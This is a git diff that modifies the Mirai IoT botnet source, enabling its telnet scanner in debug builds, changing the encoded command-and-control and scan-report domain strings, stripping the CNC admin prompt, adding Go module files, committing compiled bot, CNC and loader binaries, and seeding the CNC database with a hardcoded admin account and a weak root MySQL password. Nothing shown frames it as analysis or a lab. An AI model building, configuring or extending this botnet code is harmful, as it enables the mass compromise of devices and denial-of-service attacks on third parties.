@@ -1,0 +1,173 @@
+diff --git a/loader/loader b/loader/loader
+new file mode 100755
+index 0000000..45a9c76
+Binary files /dev/null and b/loader/loader differ
+diff --git a/mirai/bot/includes.h b/mirai/bot/includes.h
+index 63eeeb6..11e279e 100755
+--- a/mirai/bot/includes.h
++++ b/mirai/bot/includes.h
+@@ -28,7 +28,7 @@ typedef uint16_t port_t;
+ #define CNC_OP_PROXY        0x30
+ #define CNC_OP_ATTACK       0x40
+ 
+-ipv4_t LOCAL_ADDR;
++extern ipv4_t LOCAL_ADDR;
+ 
+ #ifdef DEBUG
+ static char *outptr;
+diff --git a/mirai/bot/main.c b/mirai/bot/main.c
+index 8c0510f..df269ac 100755
+--- a/mirai/bot/main.c
++++ b/mirai/bot/main.c
+@@ -23,6 +23,7 @@
+ #include "scanner.h"
+ #include "util.h"
+ #include "resolv.h"
++ipv4_t LOCAL_ADDR;
+ 
+ static void anti_gdb_entry(int);
+ static void resolve_cnc_addr(void);
+@@ -155,10 +156,8 @@ int main(int argc, char **args)
+ 
+     attack_init();
+     killer_init();
+-#ifndef DEBUG
+ #ifdef MIRAI_TELNET
+     scanner_init();
+-#endif
+ #endif
+ 
+     while (TRUE)
+diff --git a/mirai/bot/table.c b/mirai/bot/table.c
+index 13b341e..18ffc79 100755
+--- a/mirai/bot/table.c
++++ b/mirai/bot/table.c
+@@ -15,10 +15,10 @@ struct table_value table[TABLE_MAX_KEYS];
+ 
+ void table_init(void)
+ {
+-    add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 30); // cnc.changeme.com
++    add_entry(TABLE_CNC_DOMAIN, "NMACNJMQV\"", 10); // cnc.changeme.com
+     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
+ 
+-    add_entry(TABLE_SCAN_CB_DOMAIN, "\x50\x47\x52\x4D\x50\x56\x0C\x41\x4A\x43\x4C\x45\x47\x4F\x47\x0C\x41\x4D\x4F\x22", 29); // report.changeme.com
++    add_entry(TABLE_SCAN_CB_DOMAIN, "NMACNJMQV\"", 10); // report.changeme.com
+     add_entry(TABLE_SCAN_CB_PORT, "\x99\xC7", 2);         // 48101
+ 
+     add_entry(TABLE_EXEC_SUCCESS, "\x4E\x4B\x51\x56\x47\x4C\x4B\x4C\x45\x02\x56\x57\x4C\x12\x22", 15);
+diff --git a/mirai/build.sh b/mirai/build.sh
+index 51afd44..25720de 100755
+--- a/mirai/build.sh
++++ b/mirai/build.sh
+@@ -1,4 +1,5 @@
+ #!/bin/bash
++set -ex
+ 
+ FLAGS=""
+ 
+@@ -49,10 +50,6 @@ elif [ "$1" == "release" ]; then
+     go build -o release/scanListen tools/scanListen.go
+ elif [ "$1" == "debug" ]; then
+     gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/mirai.dbg
+-    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.mips
+-    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm
+-    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.arm7
+-    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/mirai.sh4
+     gcc -std=c99 tools/enc.c -g -o debug/enc
+     gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
+     gcc -std=c99 tools/badbot.c -g -o debug/badbot
+diff --git a/mirai/cnc/admin.go b/mirai/cnc/admin.go
+index 28a2091..61638c6 100755
+--- a/mirai/cnc/admin.go
++++ b/mirai/cnc/admin.go
+@@ -5,7 +5,6 @@ import (
+     "net"
+     "time"
+     "strings"
+-    "io/ioutil"
+     "strconv"
+ )
+ 
+@@ -25,12 +24,8 @@ func (this *Admin) Handle() {
+         this.conn.Write([]byte("\033[?1049l"))
+     }()
+ 
+-    headerb, err := ioutil.ReadFile("prompt.txt")
+-    if err != nil {
+-        return
+-    }
+ 
+-    header := string(headerb)
++    header := ""
+     this.conn.Write([]byte(strings.Replace(strings.Replace(header, "\r\n", "\n", -1), "\n", "\r\n", -1)))
+ 
+     // Get username
+diff --git a/mirai/debug/badbot b/mirai/debug/badbot
+new file mode 100755
+index 0000000..8f549d7
+Binary files /dev/null and b/mirai/debug/badbot differ
+diff --git a/mirai/debug/cnc b/mirai/debug/cnc
+new file mode 100755
+index 0000000..737e7bc
+Binary files /dev/null and b/mirai/debug/cnc differ
+diff --git a/mirai/debug/enc b/mirai/debug/enc
+new file mode 100755
+index 0000000..ea1c98e
+Binary files /dev/null and b/mirai/debug/enc differ
+diff --git a/mirai/debug/mirai.dbg b/mirai/debug/mirai.dbg
+new file mode 100755
+index 0000000..eae01ae
+Binary files /dev/null and b/mirai/debug/mirai.dbg differ
+diff --git a/mirai/debug/nogdb b/mirai/debug/nogdb
+new file mode 100755
+index 0000000..62891fa
+Binary files /dev/null and b/mirai/debug/nogdb differ
+diff --git a/mirai/debug/scanListen b/mirai/debug/scanListen
+new file mode 100755
+index 0000000..c1380b6
+Binary files /dev/null and b/mirai/debug/scanListen differ
+diff --git a/mirai/go.mod b/mirai/go.mod
+new file mode 100644
+index 0000000..b6a6e12
+--- /dev/null
++++ b/mirai/go.mod
+@@ -0,0 +1,10 @@
++module mirai
++
++go 1.24.2
++
++require (
++	github.com/go-sql-driver/mysql v1.9.1
++	github.com/mattn/go-shellwords v1.0.12
++)
++
++require filippo.io/edwards25519 v1.1.0 // indirect
+diff --git a/mirai/go.sum b/mirai/go.sum
+new file mode 100644
+index 0000000..2d3ce1a
+--- /dev/null
++++ b/mirai/go.sum
+@@ -0,0 +1,6 @@
++filippo.io/edwards25519 v1.1.0 h1:FNf4tywRC1HmFuKW5xopWpigGjJKiJSV0Cqo0cJWDaA=
++filippo.io/edwards25519 v1.1.0/go.mod h1:BxyFTGdWcka3PhytdK4V28tE5sGfRvvvRV7EaN4VDT4=
++github.com/go-sql-driver/mysql v1.9.1 h1:FrjNGn/BsJQjVRuSa8CBrM5BWA9BWoXXat3KrtSb/iI=
++github.com/go-sql-driver/mysql v1.9.1/go.mod h1:qn46aNg1333BRMNU69Lq93t8du/dwxI64Gl8i5p1WMU=
++github.com/mattn/go-shellwords v1.0.12 h1:M2zGm7EW6UQJvDeQxo4T51eKPurbeFbe8WtebGE2xrk=
++github.com/mattn/go-shellwords v1.0.12/go.mod h1:EZzvwXDESEeg03EKmM+RmDnNOPKG4lLtQsUlTZDWQ8Y=
+diff --git a/scripts/db.sql b/scripts/db.sql
+index 6d873dc..fc660c6 100644
+--- a/scripts/db.sql
++++ b/scripts/db.sql
+@@ -1,4 +1,5 @@
+ CREATE DATABASE mirai;
++USE mirai;
+ 
+ CREATE TABLE `history` (
+   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+@@ -34,3 +35,6 @@ CREATE TABLE `whitelist` (
+   PRIMARY KEY (`id`),
+   KEY `prefix` (`prefix`)
+ );
++INSERT INTO users VALUES (NULL, 'm1r41', 'p455w', 0, 0, 0, 0, -1, 1, 30, '');
++SET PASSWORD for 'root'@'localhost' = PASSWORD('password');
++FLUSH PRIVILEGES;
